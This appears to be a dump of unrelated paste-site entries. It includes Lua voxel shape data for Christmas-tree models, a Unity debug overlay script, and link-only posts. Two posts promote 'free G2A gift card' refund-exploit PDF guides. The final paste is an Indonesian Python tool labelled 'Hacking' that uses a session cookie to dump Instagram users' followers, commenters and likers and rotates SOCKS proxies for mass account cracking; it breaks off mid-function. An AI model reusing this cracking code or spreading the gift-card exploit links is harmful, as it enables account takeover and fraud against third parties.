    { 6,5,7,7,7,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,5,0,8,10,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,5,6,8,7,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,5,0,9,10,5,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,5,5,9,7,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,5,0,10,10,3,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,5,3,10,7,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,5,0,11,7,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,5,0,12,8,3,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,5,3,12,7,4,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,5,0,13,8,1,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 2,7,9,4,8,11,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,7,8,6,8,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,7,7,7,8,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,7,6,8,8,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,7,5,9,8,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,7,3,11,8,5,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,7,5,10,8,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,7,0,11,8,5,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,7,3,12,8,4,texture = ""snow"", tint = 0xffff66 },
    { 2,8,9,3,9,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,8,8,5,9,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,8,7,7,9,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,8,6,8,9,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,8,5,9,9,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,8,3,10,9,4,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,8,0,11,9,2,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,9,8,5,10,9,texture = ""snow"", tint = 0xffff66 },
    { 10,9,0,11,10,1,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 0,10,0,2,15,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 0,10,8,3,13,9,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 0,10,9,2,12,10,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 2,10,0,4,15,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 2,10,7,4,12,9,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 4,10,0,6,12,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,10,0,7,15,4,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,10,4,7,12,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,10,0,8,15,3,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,10,3,9,12,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,10,5,8,12,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,10,0,9,12,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,10,0,10,12,3,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,10,0,11,13,1,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 1,12,9,2,13,10,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 2,12,7,5,13,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 4,12,0,5,15,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 4,12,6,5,13,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 5,12,0,6,15,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 5,12,5,6,13,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,12,4,7,13,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,12,3,8,13,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,12,0,9,13,4,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,12,0,10,13,2,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 2,13,7,3,14,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 4,13,6,5,14,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 5,13,5,6,14,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,13,4,7,14,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,13,3,8,14,4,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,13,4,8,14,5,texture = ""snow"", tint = 0xffff66 },
    { 8,13,0,9,14,2,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,14,0,9,15,1,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 0,15,0,9,16,1,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,15,1,8,16,3,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,15,3,7,16,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,15,4,6,16,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,15,5,5,16,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,15,6,4,16,7,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,15,7,1,16,8,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 1,15,7,2,16,8,texture = ""snow"", tint = 0xffff66 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 0,0,8,3,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 1,0,7,2,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 3,0,9,4,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 4,0,10,5,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 5,0,11,6,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 6,0,12,7,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 7,0,13,8,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,1,9,2,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 2,1,10,4,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 4,1,11,5,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 5,1,12,6,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 6,1,14,7,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,2,9,1,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 1,2,10,3,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 3,2,11,5,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 5,2,12,6,3,13,texture = ""snow"", tint = 0xffff66 },
    { 5,2,13,6,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 6,2,15,7,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,3,10,2,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 2,3,11,4,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 4,3,12,5,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 5,3,14,6,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,4,11,2,5,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 2,4,12,4,5,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 4,4,14,5,5,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,5,11,1,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 1,5,12,3,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 3,5,13,4,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 4,5,15,5,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,6,11,1,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 1,6,12,3,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 3,6,13,4,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 4,6,15,5,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 0,7,12,1,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 1,7,12,2,8,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 2,7,13,3,8,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 3,7,14,4,8,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 1,8,13,2,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 2,8,13,3,9,14,texture = ""snow"", tint = 0xffff66 },
    { 2,8,14,3,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 3,8,15,4,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 0,10,13,1,13,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 1,10,13,2,11,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 2,10,14,3,11,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 1,11,14,2,14,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 2,11,15,3,13,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 0,13,14,2,14,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 0,14,14,1,15,16,texture = ""leaves_spruce_opaque"", tint = 0x00ee00 },
    { 1,14,15,2,15,16,texture = ""leaves_spruce_opaque"", tint = 0x00ee00 },
    { 0,15,15,1,16,16,texture = ""snow"", tint = 0xffcc33 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 0,0,0,6,3,2,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,0,2,5,3,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,0,4,3,1,7,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 3,0,4,4,1,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 4,0,4,5,1,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 5,0,2,6,1,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 6,0,0,7,1,3,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 7,0,0,8,1,2,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 8,0,0,9,1,1,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,1,4,3,3,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,1,5,2,2,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 3,1,4,4,2,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 5,1,2,6,2,3,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 6,1,0,7,2,1,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,2,5,1,3,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 0,3,0,4,6,2,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,3,2,3,6,3,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,3,3,2,4,5,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 2,3,3,4,4,4,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 3,3,2,4,4,4,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 4,3,0,5,4,3,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 5,3,0,6,4,1,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,4,3,2,5,4,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 3,4,2,4,5,3,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 4,4,0,5,5,1,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 4,4,2,5,5,3,texture = ""snow"", tint = 0xffff66 },
    { 0,5,3,1,6,4,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 0,6,0,3,10,1,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 0,6,1,2,10,2,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 0,6,2,1,10,3,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 0,6,3,1,7,4,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 1,6,2,3,7,3,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 2,6,1,3,7,3,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 3,6,0,4,7,2,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 1,7,2,2,8,3,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 2,7,1,3,8,2,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 3,7,0,4,8,1,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 0,10,0,2,14,1,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 0,10,1,1,13,2,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 1,10,1,2,11,2,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 2,10,0,3,11,1,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 2,12,0,3,13,1,texture = ""snow"", tint = 0xffff66 },
    { 0,14,0,1,15,1,texture = ""leaves_spruce_opaque"", tint = 0x00ee00 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 0,0,15,1,5,16,texture = ""snow"", tint = 0xffcc33 },
    { 0,1,14,1,2,15,texture = ""snow"", tint = 0xffcc66 },
    { 1,1,15,2,2,16,texture = ""snow"", tint = 0xffcc66 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 0,1,0,1,2,1,texture = ""snow"", tint = 0xffcc66 },
  }
}"
51Fjx3bu,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Thursday 7th of March 2024 06:04:40 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_701597.pdf

Working as of:
08 March 2024"
p7E8f2kc,Dubious Variable Monitor from Unity Discord,schooliedee,C#,Thursday 7th of March 2024 05:14:35 PM CDT,"using System;
using UnityEngine;
using System.Reflection;
using System.Collections.Generic;

namespace Fnord.Helper
{
    public class DebugObserver : MonoBehaviour
    {
        private List<string> observedValues = new List<string>();
        public Vector2 offset;
        public DisplayPosition displayPosition = DisplayPosition.TopLeft;

        void OnGUI()
        {
            GUIStyle style = new GUIStyle
            {
                fontSize = 16,
                normal = { textColor = Color.white },
                alignment = GetAlignmentBasedOnPosition()
            };

            Vector2 position = CalculateStartPosition();

            foreach (var value in observedValues)
            {
                GUI.Label(new Rect(position, new Vector2(190, 20)), value, style);
                position.y += 20; // Move down for the next value.
            }
        }

        TextAnchor GetAlignmentBasedOnPosition()
        {
            switch (displayPosition)
            {
                case DisplayPosition.TopLeft:
                    return TextAnchor.UpperLeft;
                case DisplayPosition.TopRight:
                    return TextAnchor.UpperRight;
                case DisplayPosition.BottomLeft:
                    return TextAnchor.LowerLeft;
                case DisplayPosition.BottomRight:
                    return TextAnchor.LowerRight;
                case DisplayPosition.TopCenter:
                    return TextAnchor.UpperCenter;
                case DisplayPosition.BottomCenter:
                    return TextAnchor.LowerCenter;
                default:
                    return TextAnchor.UpperLeft; // Default alignment
            }
        }

        Vector2 CalculateStartPosition()
        {
            Vector2 basePosition = new Vector2();
            switch (displayPosition)
            {
                case DisplayPosition.TopLeft:
                    basePosition = new Vector2(10, 10);
                    break;
                case DisplayPosition.TopRight:
                    basePosition = new Vector2(Screen.width - 200, 10);
                    break;
                case DisplayPosition.BottomLeft:
                    basePosition = new Vector2(10, Screen.height - 20 * observedValues.Count - 10);
                    break;
                case DisplayPosition.BottomRight:
                    basePosition = new Vector2(Screen.width - 200, Screen.height - 20 * observedValues.Count - 10);
                    break;
                case DisplayPosition.TopCenter:
                    basePosition = new Vector2((Screen.width - 190) / 2, 10);
                    break;
                case DisplayPosition.BottomCenter:
                    basePosition = new Vector2((Screen.width - 190) / 2, Screen.height - 20 * observedValues.Count - 10);
                    break;
                default:
                    basePosition = new Vector2(10, 10); // Default to TopLeft if for some reason the position is not recognized
                    break;
            }
            // Apply the offset
            return basePosition + offset;
        }



        void Update()
        {
            observedValues.Clear();

            foreach (var go in FindObjectsOfType<MonoBehaviour>())
            {
                // Observing fields
                foreach (var field in go.GetType().GetFields(BindingFlags.Public | BindingFlags.Instance | BindingFlags.NonPublic))
                {
                    var observeAttr = field.GetCustomAttribute<ObserveAttribute>();
                    if (observeAttr != null)
                    {
                        string label = string.IsNullOrEmpty(observeAttr.Label) ? field.Name + "": "" : observeAttr.Label;
                        string valueToDisplay = label + field.GetValue(go)?.ToString();
                        observedValues.Add(valueToDisplay);
                    }
                }

                // Observing properties
                foreach (var prop in go.GetType().GetProperties(BindingFlags.Public | BindingFlags.Instance | BindingFlags.NonPublic))
                {
                    // Ensure the property has a get method
                    if (prop.GetGetMethod(nonPublic: true) == null)
                    {
                        continue; // Skip properties without a get method
                    }

                    var observeAttr = prop.GetCustomAttribute<ObserveAttribute>();
                    if (observeAttr != null)
                    {
                        string label = string.IsNullOrEmpty(observeAttr.Label) ? prop.Name + "": "" : observeAttr.Label;
                        string valueToDisplay = label + prop.GetValue(go)?.ToString();
                        observedValues.Add(valueToDisplay);
                    }
                }
            }
        }
    }

    [AttributeUsage(AttributeTargets.Field | AttributeTargets.Property, AllowMultiple = false)]
    public class ObserveAttribute : Attribute
    {
        public string Label { get; private set; }

        public ObserveAttribute() : this(string.Empty) { }

        public ObserveAttribute(string label)
        {
            Label = label;
        }
    }

    public enum DisplayPosition
    {
        TopLeft,
        TopRight,
        BottomLeft,
        BottomRight,
        TopCenter,
        BottomCenter
    }

} // namespace
"
hBSktwtQ,Lkyt,Gruzing,Lua,Thursday 7th of March 2024 05:13:23 PM CDT,"https://www.cda.pl/video/10062294d2

https://www.cda.pl/video/7918199f1

https://www.cda.pl/video/811719253

https://www.cda.pl/video/17763712d5

"
UtaJcJVR,G2A.com Free Gift Card Guide Mar 2024 Updated,HastyBasher0,GetText,Thursday 7th of March 2024 04:59:39 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1QX2f9c6IIh85U8kry1bxwlS9OdjQFGFZ/view?usp=sharing
or
https://smallpdf.com/file#s=e45853d1-004b-4ae4-968e-c4f2afc13e32

Working as of:
07 March 2024"
UH0yRhAC,motd for my fan game,Yobanzda,Lua,Thursday 7th of March 2024 04:40:18 PM CDT,"7 day notice

seems like there is the first seasonal in the shop for an badge! go ahead and buy untill it goes away!"
fXAffEn1,140.213.218.51-/sdcard/instagram.py.py,OBF-XIn,Python,Thursday 7th of March 2024 04:35:16 PM CDT,"# create by ZORA ID 2024

import os, re, sys, json, time, random, datetime, requests
import uuid, hmac, hashlib, urllib, shutil
from asset.enc_password import Requre
from asset.amankan_data import Require
from asset.useragent import Useragent
from asset.asset2.facebook import Facebook
from bs4 import BeautifulSoup as bs
from rich.tree import Tree
from rich import print as printz
from rich.panel import Panel
from rich.console import Console
from rich.columns import Columns
from concurrent.futures import ThreadPoolExecutor

dump = []
            
class Requ:
    def __init__(self) -> None:
        self.proxies = []
        pass        
        
    def Convert_Name(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://www.instagram.com/{xxx}/', headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}, cookies={'cookie': cookie}).text
                if 'user_id' in str(response):
                    return(re.findall('""user_id"":""(\d+)""', str(response))[0])
            except (Exception) as e: pass
            
    def Convert_Url(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(xxx, cookies={'cookie': cookie}).text
                if 'media_id' in str(response):
                    return(re.findall('{""media_id"":""(.*?)""',str(response))[0])
            except (Exception) as e: exit(e)

    def Validasi_Username(self, username):
       with requests.Session() as r:
           try:
               response = r.get(""https://i.instagram.com/api/v1/users/web_profile_info/?username={}"".format(username), headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}).json()
               return (response[""data""][""user""][""full_name""], response[""data""][""user""][""edge_followed_by""][""count""], response[""data""][""user""][""edge_follow""][""count""], response[""data""][""user""][""edge_owner_to_timeline_media""][""count""])
           except (Exception) as e: return(None,None,None,None)
        
    def Socksku(self):
        with requests.Session() as r:
            try:
                response = r.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all'.format('socks5')).text
                for prox in response.splitlines():
                    self.proxies.append(prox)
                return self.proxies
            except (requests.exceptions.ConnectionError): time.sleep(5); self.Socksku()                 

class Terminal:
    def __init__(self) -> None:
        pass
        
    def Clear_Terminal(self):
        os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        
    def Banner_Terminal(self):
        self.Clear_Terminal()
        Console(width = 65, style = ""bold grey50"").print(Panel(""""""[bold red]●[bold yellow] ●[bold green] ●[bold white]
[bold red]           _____                 _____  _____)     __  
[bold red]          (, /  |       ,       (, /  /        (__/  ) 
            /---| __      __      /  /   ___     /     
[bold white]         ) /    |_/_)__(_     ___/__/     / ) ) /      
[bold white]        (_/    .-/          (__ /  (____ /   (_/       
              (_/                                            
     [bold white]Version :[bold blue] 2.0[bold white] || Status :[bold green] Premium[bold white] || Type :[bold blue] Hacking""""""))
        return (""Berhasil"")
        
    def Layar_Terminal(self):
        self.get_terminal_size = re.search('columns=(\d+),', str(os.get_terminal_size())).group(1)
        if int(self.get_terminal_size) < 65:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Anda Diwajibkan Untuk Mengecilkan Tampilan Termux Sampai Kotak Ini Terlihat Rapi!...""))
            exit()
        else:
            pass
        
class Login:
    def __init__(self) -> None:
        Terminal().Layar_Terminal()
        pass
        
    def Username_And_Password(self):
        try:
            Terminal().Banner_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silakan Masukan Cookie Instagram, Pastikan Akun Tidak Limite!"", subtitle = ""╭─────"", subtitle_align = ""left""))
            cookies = Console().input(""[bold grey50]   ╰─> "")
            if len(cookies) >0:
                self.username,  self.fullname = self.Validasi_Cookies(cookies)
                with open('Cookie_Instagram.json', 'w') as wr:
                    wr.write(json.dumps({
                        ""Cookie"": cookies,
                    }))
                    wr.close()
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Datang [green]{self.username}/{self.fullname}[white], Jalankan Ulang Perintahnya!!...""))
                exit()
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Masukan Cookie Instagram, Masukan Dengan Benar, Jangan Kosong Ngab!!...""))
                exit()
        except (KeyboardInterrupt, Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Salah, Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!"")) 
            exit()     
        
    def Validasi_Cookies(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            })
            response = r.get('https://i.instagram.com/api/v1/users/{}/info/'.format(re.findall('ds_user_id=(\d+)',str(cookies))[0]), cookies = {
                'cookie': cookies
            })
            self.payload = json.loads(response.text)
            if '\'username\':' in str(self.payload):
                self.username = self.payload['user']['username']
                self.fullname = self.payload['user']['full_name']
                return(self.username, self.fullname)
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!""))
                time.sleep(3.5)
                self.Username_And_Password()
                
class Instagram:
    def __init__(self):
        self.Kilometers, self.Meterans, self.amankan_akun = [],[],[]
        self.success, self.chekpoint, self.faktor, self.looping = 0,0,0,0

    def Remove_Cookie(self):
        try: os.system('rm -rf Cookie_Instagram.json')
        except (Exception): pass
        Login().Username_And_Password() 

    def Chek_Cookies(self, created, exspired, sisa):
        try:
           cookie = json.loads(open('Cookie_Instagram.json', 'r').read())['Cookie']
           self.Menu_Instagram(created, exspired, sisa, cookie)          
        except (FileNotFoundError) as e:
           Terminal().Clear_Terminal()
           Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
           Console().input(""[bold grey50]   ╰─> File Not Found Error!!.."")
           self.Remove_Cookie()
           
    def Menu_Instagram(self, created, exspired, sisa, cookie):
        try:
            self.username, self.fullname = Login().Validasi_Cookies(cookie)
        except (KeyError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Cookie Exspired Atau Limite!!.."")
            self.Remove_Cookie() 
            
        except (requests.exceptions.ConnectionError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Koneksi Anda Error!!.."")
            self.Chek_Cookies()
        try:                     
            Terminal().Banner_Terminal() 
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Username [bold green]{self.username}\n[bold green]•[bold white] Fullname [bold green]{self.fullname}', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info Akun) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Bergabung [bold green]{created}\n[bold green]•[bold white] Expired [bold green]{exspired} [bold yellow]{sisa}[bold white] hari', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info License) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            Console().print(Columns(self.Kilometers))
        except (AttributeError) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        Console(width = 65, style = ""bold grey50"").print(Panel('''[bold white][bold green]01[bold white]. Crack Nama Dari Follower\t[bold white][bold green]06[bold white]. Chek Result Crack\n[bold white][bold green]02[bold white]. Crack Nama Dari Followed\t[bold white][bold green]07[bold white]. Beralih Ke Facebook\n[bold white][bold green]03[bold white]. Crack Nama Dari Search\t[bold white][bold green]00[bold red].[bold red] Deleted Cookies\n[bold white][bold green]04[bold white]. Crack Nama Dari Komentar\n[bold white][bold green]05[bold white]. Crack Nama Dari Likes''', subtitle = ""╭─────"", subtitle_align = ""left""))
        query = Console().input(""[bold grey50]   ╰─> "")
        if query == '01' or query == '1':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Followers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
